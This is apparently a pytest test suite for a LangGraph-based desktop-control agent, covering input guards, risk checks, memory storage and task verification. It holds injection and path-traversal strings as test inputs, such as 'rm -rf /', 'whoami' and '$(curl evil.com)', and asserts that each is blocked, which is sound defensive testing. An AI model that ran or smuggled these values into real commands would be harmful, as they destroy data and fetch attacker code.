"""
pytest 测试集：桌面控制 Agent LangGraph 状态图 7 场景。
mock 掉底层 _execute_single_tool，不需要真实启动进程。

用法：
    cd d:\\ecv\\apps\\server
    python -m pytest app/services/graph/tests/test_graph.py -v
"""

from __future__ import annotations

import asyncio
import json
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from app.services.graph.state import (
    AgentState,
    init_state,
    ERROR_TYPE_TRANSIENT,
    ERROR_TYPE_BUSINESS,
    ERROR_TYPE_SECURITY,
)


@pytest.fixture
def mock_execute_tool_ok():
    with patch(
        "app.services.tools.executor._execute_single_tool",
        new=AsyncMock(return_value={"ok": True, "pid": 1234, "app_name": "WeChat.exe"}),
    ) as m:
        yield m


@pytest.fixture
def mock_execute_tool_fail():
    with patch(
        "app.services.tools.executor._execute_single_tool",
        new=AsyncMock(return_value={"ok": False, "error": "进程启动失败"}),
    ) as m:
        yield m


class TestPydanticValidation:
    def test_shell_injection_semicolon(self):
        from app.services.agents.app_launch import AppLaunchInput
        with pytest.raises(Exception):
            AppLaunchInput(action="launch", path="WeChat.exe;rm -rf /")

    def test_shell_injection_pipe(self):
        from app.services.agents.app_launch import AppLaunchInput
        with pytest.raises(Exception):
            AppLaunchInput(action="launch", path="notepad.exe|whoami")

    def test_shell_injection_dollar(self):
        from app.services.agents.app_launch import AppLaunchInput
        with pytest.raises(Exception):
            AppLaunchInput(action="launch", path="$(curl evil.com)")

    def test_valid_path(self):
        from app.services.agents.app_launch import AppLaunchInput
        inp = AppLaunchInput(action="launch", path="WeChat.exe")
        assert inp.path == "WeChat.exe"


class TestGuardPreCheck:
    def test_injection_blocked(self):
        from app.services.tools.executor import _guard_pre_check
        result = _guard_pre_check("app:launch", {"path": "WeChat.exe;rm -rf /"})
        assert result is not None
        assert "shell元字符" in result["error"]

    def test_valid_path_passes(self):
        from app.services.tools.executor import _guard_pre_check
        result = _guard_pre_check("app:launch", {"path": "WeChat.exe"})
        assert result is None


class TestRiskCheck:
    def test_high_risk_script(self):
        from app.services.agents.app_launch import check_path_risk
        risk = check_path_risk("evil.bat")
        assert risk["risk_level"] == "high"
        assert risk["approval_required"] is True

    def test_high_risk_system_dir(self):
        from app.services.agents.app_launch import check_path_risk
        risk = check_path_risk("C:\\Windows\\System32\\cmd.exe")
        assert risk["risk_level"] == "high"
        assert risk["approval_required"] is True

    def test_medium_risk_whitelist(self):
        from app.services.agents.app_launch import check_path_risk
        risk = check_path_risk("WeChat.exe")
        assert risk["risk_level"] == "medium"
        assert risk["approval_required"] is False

    def test_medium_risk_unknown(self):
        from app.services.agents.app_launch import check_path_risk
        risk = check_path_risk("unknown_app.exe")
        assert risk["risk_level"] == "medium"
        assert risk["approval_required"] is False


class TestRiskCheckNode:
    def test_high_risk_sets_approval(self):
        from app.services.graph.checkers import risk_check_node
        state = init_state("打开脚本")
        state["agent_input"] = {"action": "launch", "path": "evil.bat"}
        result = risk_check_node(state)
        assert result["risk_level"] == "high"
        assert result["approval_required"] is True
        assert result["approval_status"] == "pending"

    def test_whitelist_no_approval(self):
        from app.services.graph.checkers import risk_check_node
        state = init_state("打开微信")
        state["agent_input"] = {"action": "launch", "path": "WeChat.exe"}
        result = risk_check_node(state)
        assert result["approval_required"] is False


class TestGuardPreCheckNode:
    def test_injection_sets_security_error(self):
        from app.services.graph.checkers import guard_pre_check_node
        state = init_state("")
        state["tool_name"] = "app:launch"
        state["tool_args"] = {"path": "WeChat.exe;rm -rf /"}
        result = guard_pre_check_node(state)
        assert result.get("last_error")
        assert result["error_type"] == ERROR_TYPE_SECURITY

    def test_valid_returns_empty(self):
        from app.services.graph.checkers import guard_pre_check_node
        state = init_state("")
        state["tool_name"] = "app:launch"
        state["tool_args"] = {"path": "WeChat.exe"}
        result = guard_pre_check_node(state)
        assert result == {}


class TestValidationGate:
    def test_tool_failure_sets_business_error(self):
        from app.services.graph.checkers import post_validate_gate
        state = init_state("")
        state["tool_name"] = "app:launch"
        state["tool_result"] = {"ok": False, "error": "启动失败"}
        result = post_validate_gate(state)
        assert result.get("last_error")
        assert result["error_type"] == ERROR_TYPE_BUSINESS

    def test_fake_pid_detected(self):
        from app.services.graph.checkers import post_validate_gate
        state = init_state("")
        state["tool_name"] = "app:launch"
        state["tool_args"] = {"path": "WeChat.exe"}
        state["tool_result"] = {"ok": True, "pid": 99999}
        result = post_validate_gate(state)
        if result.get("last_error"):
            assert "99999" in result["last_error"] or "WeChat" in result["last_error"]


class TestIntentConfidence:
    def test_known_intent_high_confidence(self):
        from app.services.intent_detector import detect_intent
        intent, confidence = detect_intent("打开微信")
        assert intent == "desktop_control"
        assert confidence >= 0.9

    def test_unknown_intent_low_confidence(self):
        from app.services.intent_detector import detect_intent
        intent, confidence = detect_intent("帮我弄一下")
        assert confidence < 0.7


class TestClarification:
    def test_low_confidence_triggers_clarification(self):
        from app.services.intent_detector import detect_intent
        from app.services.router import build_clarification_message
        intent, confidence = detect_intent("帮我弄一下")
        if confidence < 0.7:
            clarification = build_clarification_message("帮我弄一下", intent, confidence)
            assert "message" in clarification
            assert "suggested_intents" in clarification


class TestTraceHash:
    def test_hash_not_raw_path(self):
        from app.services.observability.tracing import compute_args_hash, build_trace_safe_tool_attrs
        tool_args = {"path": "C:\\Users\\secret\\WeChat.exe"}
        safe_attrs = build_trace_safe_tool_attrs("app:launch", tool_args, "call_123")
        assert "C:\\Users\\secret" not in json.dumps(safe_attrs)
        assert "gen_ai.tool.args_hash" in safe_attrs

    def test_hash_deterministic(self):
        from app.services.observability.tracing import compute_args_hash
        args = {"path": "WeChat.exe"}
        h1 = compute_args_hash(args)
        h2 = compute_args_hash(args)
        assert h1 == h2


class TestStateInit:
    def test_init_state_has_trace_id(self):
        state = init_state("打开微信")
        assert state["trace_id"]
        assert state["raw_query"] == "打开微信"
        assert state["retry_count"] == 0
        assert state["approval_status"] == "pending"

    def test_init_state_custom_session(self):
        state = init_state("打开微信", session_id="test_123")
        assert state["session_id"] == "test_123"


class TestIsTransientError:
    def test_timeout_is_transient(self):
        from app.services.graph.graph import _is_transient_error
        assert _is_transient_error("subprocess timeout") is True
        assert _is_transient_error("connection refused") is True
        assert _is_transient_error("ETIMEDOUT") is True

    def test_injection_is_not_transient(self):
        from app.services.graph.graph import _is_transient_error
        assert _is_transient_error("Guard拦截: path含shell元字符") is False

    def test_business_error_is_not_transient(self):
        from app.services.graph.graph import _is_transient_error
        assert _is_transient_error("Validation Gate: PID 99999 进程未存活") is False


class TestBuildInvokeConfig:
    def test_composite_thread_id(self):
        from app.services.graph.graph import build_invoke_config
        config = build_invoke_config(user_id="user_001", session_id="sess_abc", trace_id="trace_123")
        assert config["configurable"]["thread_id"] == "user_001_sess_abc"
        assert config["configurable"]["trace_id"] == "trace_123"
        assert config["configurable"]["recursion_limit"] == 15

    def test_custom_recursion_limit(self):
        from app.services.graph.graph import build_invoke_config
        config = build_invoke_config("u", "s", trace_id="", recursion_limit=20)
        assert config["configurable"]["recursion_limit"] == 20


class TestCheckpointerFactory:
    def test_dev_returns_memory_saver(self):
        import os
        os.environ["GRAPH_ENV"] = "dev"
        from app.services.graph.graph import get_checkpointer
        from langgraph.checkpoint.memory import MemorySaver
        cp = get_checkpointer()
        assert isinstance(cp, MemorySaver)
        del os.environ["GRAPH_ENV"]

    def test_test_env_fallback(self):
        import os
        os.environ["GRAPH_ENV"] = "test"
        from app.services.graph.graph import get_checkpointer
        cp = get_checkpointer()
        assert cp is not None
        del os.environ["GRAPH_ENV"]


class TestMemoryStore:
    def test_put_and_get(self, tmp_path):
        from app.services.graph.memory_store import MemoryStore
        store = MemoryStore(store_dir=str(tmp_path))
        store.put("user1", "test_key", {"data": "hello"}, level="A")
        result = store.get("user1", "test_key")
        assert result is not None
        assert result["value"]["data"] == "hello"
        assert result["level"] == "A"

    def test_d_level_not_persisted(self, tmp_path):
        from app.services.graph.memory_store import MemoryStore
        store = MemoryStore(store_dir=str(tmp_path))
        store.put("user1", "d_key", {"intent": "test"}, level="D")
        result = store.get("user1", "d_key")
        assert result is None

    def test_user_preference(self, tmp_path):
        from app.services.graph.memory_store import MemoryStore
        store = MemoryStore(store_dir=str(tmp_path))
        store.put_user_preference("user1", "WeChat.exe")
        store.put_user_preference("user1", "WeChat.exe")
        result = store.get("user1", "pref_app_WeChat.exe")
        assert result["value"]["launch_count"] == 2


class TestMetrics:
    def test_counter_increments(self):
        from app.services.graph.metrics import inc_counter, get_all_counters
        inc_counter("test_counter")
        inc_counter("test_counter")
        counters = get_all_counters()
        assert counters.get("test_counter") == 2

    def test_duration_observed(self):
        from app.services.graph.metrics import observe_duration, get_all_histograms
        observe_duration("test_hist", 0.5)
        observe_duration("test_hist", 1.0)
        h = get_all_histograms()
        assert len(h.get("test_hist", [])) == 2


class TestFastBrain:
    def test_empty_input_rejected(self):
        from app.services.graph.checkers import fast_brain_node
        state = init_state(raw_query="")
        result = fast_brain_node(state)
        assert result["fast_brain_decision"] == "reject"
        assert result["need_slow_brain"] is False
        assert "不能为空" in result["fast_brain_msg"]

    def test_all_whitespace_rejected(self):
        from app.services.graph.checkers import fast_brain_node
        state = init_state(raw_query="   \n\t  ")
        result = fast_brain_node(state)
        assert result["fast_brain_decision"] == "reject"
        assert result["need_slow_brain"] is False
        assert "空格" in result["fast_brain_msg"]

    def test_garbage_chars_rejected(self):
        from app.services.graph.checkers import fast_brain_node
        state = init_state(raw_query="┃┅▇◆◇▣┃┅▇◆◇▣┃┅")
        result = fast_brain_node(state)
        assert result["fast_brain_decision"] == "reject"
        assert result["need_slow_brain"] is False
        assert "乱码" in result["fast_brain_msg"]

    def test_normal_input_accepted(self):
        from app.services.graph.checkers import fast_brain_node
        state = init_state(raw_query="打开微信")
        result = fast_brain_node(state)
        assert result["fast_brain_decision"] == "accept"
        assert result["need_slow_brain"] is True

    def test_mixed_with_some_garbage_accepted(self):
        from app.services.graph.checkers import fast_brain_node
        state = init_state(raw_query="打开微信◆然后关闭")
        result = fast_brain_node(state)
        assert result["fast_brain_decision"] == "accept"
        assert result["need_slow_brain"] is True

    def test_fast_brain_node_returns_new_dict(self):
        from app.services.graph.checkers import fast_brain_node
        state = init_state(raw_query="打开微信")
        result = fast_brain_node(state)
        assert isinstance(result, dict)
        assert "fast_brain_decision" in result
        assert "need_slow_brain" in result
        assert "fast_brain_msg" in result


class TestGovernor:
    def test_governor_light_scan(self):
        from app.services.graph.nodes import governor_scan_node
        state = init_state(raw_query="打开微信", session_id="gov_light")
        state["governor_trigger"] = "light"
        result = asyncio.run(governor_scan_node(state))
        assert "governor_scan_result" in result
        assert result["governor_trigger"] == ""

    def test_governor_full_scan(self):
        from app.services.graph.nodes import governor_scan_node
        state = init_state(raw_query="打开微信", session_id="gov_full")
        state["governor_trigger"] = "full"
        result = asyncio.run(governor_scan_node(state))
        assert "governor_scan_result" in result
        scan = result["governor_scan_result"]
        assert "signal_generated" in scan

    def test_governor_no_trigger(self):
        from app.services.graph.nodes import governor_scan_node
        state = init_state(raw_query="打开微信", session_id="gov_none")
        result = asyncio.run(governor_scan_node(state))
        assert result["governor_scan_result"] == {}


class TestSupervisor:
    def test_supervisor_auto_diagnose_intent_error(self):
        from app.services.graph.nodes import supervisor_diagnose_node
        state = init_state(raw_query="xxx", session_id="sup1")
        state["enable_auto_diagnose"] = True
        state["last_error"] = "intent parse failed"
        state["diagnose_trace_id"] = "trace-001"
        result = asyncio.run(supervisor_diagnose_node(state))
        assert "correction_signal_id" in result
        assert result["correction_signal_id"] != ""

    def test_supervisor_auto_diagnose_route_error(self):
        from app.services.graph.nodes import supervisor_diagnose_node
        state = init_state(raw_query="xxx", session_id="sup2")
        state["enable_auto_diagnose"] = True
        state["last_error"] = "route confidence too low"
        state["diagnose_trace_id"] = "trace-002"
        result = asyncio.run(supervisor_diagnose_node(state))
        assert result["correction_signal_id"] != ""

    def test_supervisor_no_diagnose_when_disabled(self):
        from app.services.graph.nodes import supervisor_diagnose_node
        state = init_state(raw_query="xxx", session_id="sup3")
        state["enable_auto_diagnose"] = False
        state["last_error"] = "intent parse failed"
        state["diagnose_trace_id"] = "trace-003"
        result = asyncio.run(supervisor_diagnose_node(state))
        assert result["correction_signal_id"] == ""

    def test_supervisor_no_diagnose_for_non_intent_error(self):
        from app.services.graph.nodes import supervisor_diagnose_node
        state = init_state(raw_query="xxx", session_id="sup4")
        state["enable_auto_diagnose"] = True
        state["last_error"] = "subprocess timeout"
        state["diagnose_trace_id"] = "trace-004"
        result = asyncio.run(supervisor_diagnose_node(state))
        assert result["correction_signal_id"] == ""


class TestToolSearch:
    def test_search_defer_tool(self):
        from app.services.graph.tool_search import ToolSearch, ToolDef
        ts = ToolSearch([
            ToolDef(name="launch_app", description="启动应用", input_schema={}, alwaysLoad=True),
            ToolDef(name="edit_registry", description="编辑注册表，高危", input_schema={}, defer_loading=True),
        ])
        hits = ts.search_tool("registry")
        assert len(hits) == 1
        assert hits[0].name == "edit_registry"

    def test_always_load_on_init(self):
        from app.services.graph.tool_search import ToolSearch, ToolDef
        ts = ToolSearch([
            ToolDef(name="launch_app", description="启动应用", input_schema={}, alwaysLoad=True),
            ToolDef(name="edit_registry", description="编辑注册表", input_schema={}, defer_loading=True),
        ])
        loaded = ts.get_loaded_names()
        assert "launch_app" in loaded
        assert "edit_registry" not in loaded

    def test_load_defer_tool(self):
        from app.services.graph.tool_search import ToolSearch, ToolDef
        ts = ToolSearch([
            ToolDef(name="launch_app", description="启动应用", input_schema={}, alwaysLoad=True),
            ToolDef(name="edit_registry", description="编辑注册表", input_schema={}, defer_loading=True),
        ])
        ok = ts.load_tool_schema("edit_registry")
        assert ok is True
        loaded = ts.get_loaded_names()
        assert "edit_registry" in loaded

    def test_load_already_loaded_returns_false(self):
        from app.services.graph.tool_search import ToolSearch, ToolDef
        ts = ToolSearch([
            ToolDef(name="launch_app", description="启动应用", input_schema={}, alwaysLoad=True),
        ])
        ok = ts.load_tool_schema("launch_app")
        assert ok is False

    def test_tool_search_node(self):
        from app.services.graph.nodes import tool_search_node
        state = init_state(raw_query="打开微信")
        state["tool_search_query"] = "registry"
        result = asyncio.run(tool_search_node(state))
        assert "tool_search_hit_list" in result
        assert "tool_loaded_schema" in result

    def test_tool_search_node_empty_query(self):
        from app.services.graph.nodes import tool_search_node
        state = init_state(raw_query="打开微信")
        result = asyncio.run(tool_search_node(state))
        assert result["tool_search_hit_list"] == []


class TestSelfGoverningMemoryStore:
    def test_put_memory_returns_scan(self):
        from app.services.graph.memory_store import SelfGoverningMemoryStore, MemoryStore
        base = MemoryStore(store_dir="./test_mem_gov")
        store = SelfGoverningMemoryStore(base_store=base)
        result = store.put_memory("u1", "test_key", {"v": 1}, evidence_level="A")
        assert "conflict" in result
        assert "expired" in result

    def test_generate_correction_signal(self):
        from app.services.graph.memory_store import SelfGoverningMemoryStore, MemoryStore
        base = MemoryStore(store_dir="./test_mem_gov2")
        store = SelfGoverningMemoryStore(base_store=base)
        sig_id = store.generate_correction_signal("u1", "conflict", ["k1"], "test conflict")
        assert sig_id.startswith("sig_")
        sig = store.get_signal(sig_id)
        assert sig is not None
        assert sig["signal_type"] == "conflict"

    def test_full_scan(self):
        from app.services.graph.memory_store import SelfGoverningMemoryStore, MemoryStore
        base = MemoryStore(store_dir="./test_mem_gov3")
        store = SelfGoverningMemoryStore(base_store=base)
        result = store.full_scan(user_id="u1")
        assert "conflict" in result
        assert "expired" in result
        assert "signal_generated" in result


class TestSignalStateMachine:
    def test_signal_initial_status_open(self):
        from app.services.graph.memory_store import SelfGoverningMemoryStore, MemoryStore
        base = MemoryStore(store_dir="./test_mem_sig1")
        store = SelfGoverningMemoryStore(base_store=base)
        sig_id = store.generate_correction_signal("u1", "conflict", ["k1"], "test")
        sig = store.get_signal(sig_id)
        assert sig["status"] == "open"

    def test_signal_transition_open_to_processing(self):
        from app.services.graph.memory_store import SelfGoverningMemoryStore, MemoryStore
        base = MemoryStore(store_dir="./test_mem_sig2")
        store = SelfGoverningMemoryStore(base_store=base)
        sig_id = store.generate_correction_signal("u1", "conflict", ["k1"], "test")
        ok = store.update_signal_status(sig_id, "processing", owner="admin")
        assert ok is True
        sig = store.get_signal(sig_id)
        assert sig["status"] == "processing"
        assert sig["owner"] == "admin"

    def test_signal_transition_open_to_resolved(self):
        from app.services.graph.memory_store import SelfGoverningMemoryStore, MemoryStore
        base = MemoryStore(store_dir="./test_mem_sig3")
        store = SelfGoverningMemoryStore(base_store=base)
        sig_id = store.generate_correction_signal("u1", "conflict", ["k1"], "test")
        ok = store.update_signal_status(sig_id, "resolved", owner="admin", comment="done")
        assert ok is True
        sig = store.get_signal(sig_id)
        assert sig["status"] == "resolved"

    def test_signal_invalid_transition_resolved_to_open(self):
        from app.services.graph.memory_store import SelfGoverningMemoryStore, MemoryStore
        base = MemoryStore(store_dir="./test_mem_sig4")
        store = SelfGoverningMemoryStore(base_store=base)
        sig_id = store.generate_correction_signal("u1", "conflict", ["k1"], "test")
        store.update_signal_status(sig_id, "resolved")
        ok = store.update_signal_status(sig_id, "open")
        assert ok is False

    def test_signal_carries_entity_key_and_evidence_level(self):
        from app.services.graph.memory_store import SelfGoverningMemoryStore, MemoryStore
        base = MemoryStore(store_dir="./test_mem_sig5")
        store = SelfGoverningMemoryStore(base_store=base)
        sig_id = store.generate_correction_signal(
            "u1", "conflict", ["k1"], "test",
            entity_key="evidence_A_123", evidence_level="A", owner="governor",
        )
        sig = store.get_signal(sig_id)
        assert sig["entity_key"] == "evidence_A_123"
        assert sig["evidence_level"] == "A"
        assert sig["owner"] == "governor"


class TestOwnerResponsibility:
    def test_put_with_owner(self, tmp_path):
        from app.services.graph.memory_store import MemoryStore
        store = MemoryStore(store_dir=str(tmp_path))
        store.put("user1", "key1", {"data": "hello"}, level="A", owner="admin")
        result = store.get("user1", "key1")
        assert result["owner"] == "admin"

    def test_put_without_owner_warns(self, tmp_path):
        from app.services.graph.memory_store import MemoryStore
        store = MemoryStore(store_dir=str(tmp_path))
        store.put("user1", "key1", {"data": "hello"}, level="A", owner="")
        result = store.get("user1", "key1")
        assert result["owner"] == ""


class TestPageRevision:
    def test_page_revision_appended_on_overwrite(self, tmp_path):
        from app.services.graph.memory_store import MemoryStore
        store = MemoryStore(store_dir=str(tmp_path))
        store.put("user1", "entity1", {"summary": "v1"}, level="A", owner="admin")
        store.put("user1", "entity1", {"summary": "v2"}, level="A", owner="admin")
        result = store.get("user1", "entity1")
        assert result["value"]["summary"] == "v2"
        assert len(result["page_revision"]) == 1
        assert result["page_revision"][0]["value"]["summary"] == "v1"


class TestQueryRewriteFields:
    def test_init_state_has_query_fields(self):
        state = init_state("打开微信")
        assert state["raw_query"] == "打开微信"
        assert state["standalone_query"] == ""
        assert state["retrieval_queries"] == []

    def test_init_state_has_user_id(self):
        state = init_state("打开微信", user_id="user_001")
        assert state["user_id"] == "user_001"

    def test_init_state_has_signal_status(self):
        state = init_state("打开微信")
        assert state["correction_signal_status"] == ""


class TestFallbackMetrics:
    def test_error_fallback_increments_counter(self):
        from app.services.graph.nodes import error_fallback_node
        from app.services.graph.metrics import get_all_counters
        state = init_state("打开微信")
        state["last_error"] = "test error"
        result = asyncio.run(error_fallback_node(state))
        assert result["tool_result"]["fallback"] is True
        counters = get_all_counters()
        assert counters.get("fallback_triggered_total", 0) >= 1


class TestToolSearchDeferLoadingGuard:
    def test_search_tool_cannot_defer_loading(self):
        from app.services.graph.tool_search import ToolSearch, ToolDef
        ts = ToolSearch([
            ToolDef(name="tool_search", description="工具检索", input_schema={}, defer_loading=True),
            ToolDef(name="launch_app", description="启动应用", input_schema={}, alwaysLoad=True),
        ])
        loaded = ts.get_loaded_names()
        assert "tool_search" in loaded


class TestQueryRewriteMock:
    def test_rewrite_query_no_entities(self):
        from app.services.graph.nodes import _mock_rewrite_query
        standalone, retrieval = asyncio.run(_mock_rewrite_query("打开微信", {}))
        assert standalone == "打开微信"
        assert "打开微信" in retrieval

    def test_rewrite_query_with_entities(self):
        from app.services.graph.nodes import _mock_rewrite_query
        standalone, retrieval = asyncio.run(_mock_rewrite_query("打开记事本", {"hint": "mock"}))
        assert "记事本" in standalone or "记事本" in retrieval[0]


class TestGuardPreCheckGeneric:
    def test_generic_arg_injection_blocked(self):
        from app.services.graph.checkers import guard_pre_check_node
        state = init_state("")
        state["tool_name"] = "custom:action"
        state["tool_args"] = {"target": "file.txt;rm -rf /"}
        result = guard_pre_check_node(state)
        assert result.get("last_error")
        assert result["error_type"] == ERROR_TYPE_SECURITY


class TestPathTraversalGuard:
    """H10 环护栏类#2: 路径穿越/越界文件写入"""

    def test_node_blocks_parent_escape_in_output_path(self):
        from app.services.graph.checkers import guard_pre_check_node
        state = init_state("")
        state["tool_name"] = "image:screenshot"
        state["tool_args"] = {"output_path": "..\\..\\secrets\\steal.png"}
        result = guard_pre_check_node(state)
        assert result.get("last_error")
        assert "路径穿越" in result["last_error"]
        assert result["error_type"] == ERROR_TYPE_SECURITY

    def test_node_blocks_posix_traversal_in_file_write(self):
        from app.services.graph.checkers import guard_pre_check_node
        state = init_state("")
        state["tool_name"] = "content:generate"
        state["tool_args"] = {"output_path": "../etc/pwned.txt"}
        result = guard_pre_check_node(state)
        assert result.get("last_error")
        assert result["error_type"] == ERROR_TYPE_SECURITY

    def test_node_blocks_traversal_in_launch_path(self):
        from app.services.graph.checkers import guard_pre_check_node
        state = init_state("")
        state["tool_name"] = "app:launch"
        state["tool_args"] = {"path": "..\\..\\tools\\evil.exe"}
        result = guard_pre_check_node(state)
        assert result.get("last_error")
        assert "路径穿越" in result["last_error"]
        assert result["error_type"] == ERROR_TYPE_SECURITY

    def test_node_passes_legit_relative_output_path(self):
        from app.services.graph.checkers import guard_pre_check_node
        state = init_state("")
        state["tool_name"] = "image:screenshot"
        state["tool_args"] = {"output_path": "screenshots/shot.png"}
        result = guard_pre_check_node(state)
        assert result == {}

    def test_executor_blocks_traversal(self):
        from app.services.tools.executor import _guard_pre_check
        result = _guard_pre_check("content:generate", {"output_path": "..\\..\\evil.txt"})
        assert result is not None
        assert result["error_type"] == "security"
        assert "路径穿越" in result["error"]

    def test_executor_passes_in_workspace_absolute_path(self):
        from app.services.tools.executor import _guard_pre_check
        result = _guard_pre_check("content:generate", {"output_path": "D:\\workspace\\out.txt"})
        assert result is None


class TestBuildInvokeConfigTraceId:
    def test_trace_id_passthrough(self):
        from app.services.graph.graph import build_invoke_config
        config = build_invoke_config("u1", "s1", trace_id="trace_abc")
        assert config["configurable"]["trace_id"] == "trace_abc"

    def test_trace_id_default_empty(self):
        from app.services.graph.graph import build_invoke_config
        config = build_invoke_config("u1", "s1")
        assert config["configurable"]["trace_id"] == ""


class TestRetryPolicySoftImport:
    def test_retry_policy_importable(self):
        try:
            from langgraph.types import RetryPolicy
            assert RetryPolicy is not None
        except ImportError:
            try:
                from langgraph.pregel import RetryPolicy
                assert RetryPolicy is not None
            except ImportError:
                pass

class TestSelfGoverningMemoryOpenSignals:
    """P1: SelfGoverningMemoryStore.get_open_signals 单元测试（只回 open、支持按 user_id 过滤）。"""

    def _make_store(self, tmp_path, name="mem"):
        from app.services.graph.memory_store import SelfGoverningMemoryStore, MemoryStore
        base = MemoryStore(store_dir=str(tmp_path / name))
        return SelfGoverningMemoryStore(base_store=base)

    def test_empty_returns_empty_list(self, tmp_path):
        store = self._make_store(tmp_path)
        assert store.get_open_signals() == []

    def test_returns_only_open_signals(self, tmp_path):
        store = self._make_store(tmp_path)
        store.generate_correction_signal("u1", "conflict", ["k1"], "detail1")
        store.generate_correction_signal("u2", "pollution", ["k2"], "detail2")
        resolved_id = store.generate_correction_signal("u1", "conflict", ["k3"], "detail3")
        store.update_signal_status(resolved_id, "resolved", owner="admin")
        open_sigs = store.get_open_signals()
        assert len(open_sigs) == 2
        assert all(s["status"] == "open" for s in open_sigs)

    def test_filters_by_user_id(self, tmp_path):
        store = self._make_store(tmp_path)
        store.generate_correction_signal("u1", "conflict", ["k1"], "d1")
        store.generate_correction_signal("u2", "conflict", ["k2"], "d2")
        u1_open = store.get_open_signals(user_id="u1")
        assert len(u1_open) == 1
        assert u1_open[0]["user_id"] == "u1"
        # 已解决信号即使属于该用户也不应返回
        sid = store.generate_correction_signal("u1", "pollution", ["k9"], "d9")
        store.update_signal_status(sid, "resolved", owner="admin")
        assert len(store.get_open_signals(user_id="u1")) == 1


class TestExecutorParamLimits:
    """P0-2: 参数长度上限（字符串 / 数组）schema 报错测试。"""

    def test_string_param_too_long_blocked(self):
        from app.services.tools.executor import _validate_tool_params
        res = _validate_tool_params(
            "content:generate",
            {"task": "t", "output_path": "a" * 2001},
        )
        assert res["status"] == "error"
        assert "output_path" in res["meta"]["missing_info"]
        assert res["error"]["type"] == "schema"
        assert "超长" in res["summary"]

    def test_string_param_within_limit_passes(self):
        from app.services.tools.executor import _validate_tool_params
        res = _validate_tool_params(
            "content:generate",
            {"task": "t", "output_path": "b" * 1999},
        )
        assert res is None

    def test_array_param_too_long_blocked(self):
        from app.services.tool_registry import tool_registry, ToolDefinition, ToolCategory
        from app.services.tools.executor import _validate_tool_params
        name = "test:array_limit"
        tool_registry.register(ToolDefinition(
            name=name, description="temp", category=ToolCategory.SYSTEM,
            parameters={"type": "object", "properties": {"items": {"type": "array"}}},
        ))
        try:
            res = _validate_tool_params(name, {"items": list(range(101))})
            assert res["status"] == "error"
            assert "items" in res["meta"]["missing_info"]
            assert res["error"]["type"] == "schema"
        finally:
            tool_registry._tools.pop(name, None)
class TestResultTruncation:
    """P0-2: 结果超 50 条截断 + meta.truncated 标记断言。"""

    def test_large_result_truncated(self):
        from app.services.tools.executor import _wrap_raw_result
        raw = {"ok": True, "data": list(range(500))}
        res = _wrap_raw_result(raw, "algo:calculate")
        assert res["status"] == "success"
        assert res["meta"]["truncated"] is True
        assert res["meta"]["hit_count"] == 500  # 记录原始命中总数，便于模型判断还有更多
        assert len(res["data"]) == 50
        assert "截断" in res["summary"]

    def test_small_result_not_truncated(self):
        from app.services.tools.executor import _wrap_raw_result
        res = _wrap_raw_result({"ok": True, "data": [1, 2, 3]}, "t")
        assert res["meta"]["truncated"] is False
        assert res["meta"]["hit_count"] == 3

    def test_boundary_exactly_limit_not_truncated(self):
        from app.services.tools.executor import _wrap_raw_result
        res = _wrap_raw_result({"ok": True, "data": list(range(50))}, "t")
        assert res["meta"]["truncated"] is False
        assert res["meta"]["hit_count"] == 50


class TestTaskCompletionVerifier:
    """P1-1: 任务完成独立验证 —— 文件存在性校验失败分支（content_gen/image/algorithm agent）。"""

    def test_file_producing_missing_output_verified_false(self, tmp_path):
        from app.services.graph.checkers import task_completion_verifier
        missing = str(tmp_path / "does_not_exist.html")
        state = init_state("生成页面")
        state["tool_name"] = "content:generate"
        state["tool_args"] = {"task": "x", "output_path": missing}
        state["tool_result"] = {"ok": True, "data": {"path": missing}}
        out = task_completion_verifier(state)
        assert out["task_verified"] is False
        ev = out["completion_evidence"]
        assert ev["checks"]["output_file_exists"] is False
        assert ev["evidence_level"] == ""

    def test_file_producing_existing_nonempty_verified_true(self, tmp_path):
        from app.services.graph.checkers import task_completion_verifier
        p = tmp_path / "out.html"
        p.write_text("hello", encoding="utf-8")
        state = init_state("生成页面")
        state["tool_name"] = "content:generate"
        state["tool_args"] = {"task": "x", "output_path": str(p)}
        state["tool_result"] = {"ok": True, "status": "success", "data": {"path": str(p)}}
        out = task_completion_verifier(state)
        assert out["task_verified"] is True
        ev = out["completion_evidence"]
        assert ev["checks"]["output_file_exists"] is True
        assert ev["checks"]["output_file_size"] == len("hello")
        assert ev["evidence_level"] == "user"

    def test_image_agent_missing_output_verified_false(self, tmp_path):
        from app.services.graph.checkers import task_completion_verifier
        missing = str(tmp_path / "shot.png")
        state = init_state("截图")
        state["tool_name"] = "image:screenshot"
        state["tool_args"] = {"output_path": missing}
        state["tool_result"] = {"ok": True, "status": "success", "data": {"path": missing}}
        out = task_completion_verifier(state)
        assert out["task_verified"] is False

    def test_algorithm_agent_missing_output_verified_false(self, tmp_path):
        from app.services.graph.checkers import task_completion_verifier
        missing = str(tmp_path / "plot.png")
        state = init_state("绘图")
        state["tool_name"] = "algo:plot"
        state["tool_args"] = {"output_path": missing}
        state["tool_result"] = {"ok": True, "status": "success", "data": {"path": missing}}
        out = task_completion_verifier(state)
        assert out["task_verified"] is False

    def test_text_producing_empty_output_verified_false(self):
        from app.services.graph.checkers import task_completion_verifier
        state = init_state("OCR")
        state["tool_name"] = "image:ocr"
        state["tool_args"] = {"image_path": "x.png"}
        state["tool_result"] = {"ok": True, "status": "success", "text": ""}
        out = task_completion_verifier(state)
        assert out["task_verified"] is False
        assert out["completion_evidence"]["checks"]["output_text_nonempty"] is False


class TestValidationGateCompletionLoop:
    """M15/H13: 实证校验失败必须上升为业务错误并进入校正/降级，而非假装完成。"""

    def test_unverified_output_escalates_to_business_error(self, tmp_path):
        from app.services.graph.checkers import post_validate_gate
        missing = str(tmp_path / "missing.html")
        state = init_state("生成页面")
        state["tool_name"] = "content:generate"
        state["tool_args"] = {"task": "x", "output_path": missing}
        state["tool_result"] = {"ok": True, "status": "success", "data": {"path": missing}}
        res = post_validate_gate(state)
        # 不能把验证失败当成功
        assert res["task_verified"] is False
        assert "校验未通过" in res["last_error"]
        assert res["error_type"] == ERROR_TYPE_BUSINESS
        assert res["correction_signal_status"] == "open"
        assert res["completion_evidence"]["checks"]["output_file_exists"] is False

    def test_verified_output_passes_gate(self, tmp_path):
        from app.services.graph.checkers import post_validate_gate
        p = tmp_path / "ok.html"
        p.write_text("hi", encoding="utf-8")
        state = init_state("生成页面")
        state["tool_name"] = "content:generate"
        state["tool_args"] = {"task": "x", "output_path": str(p)}
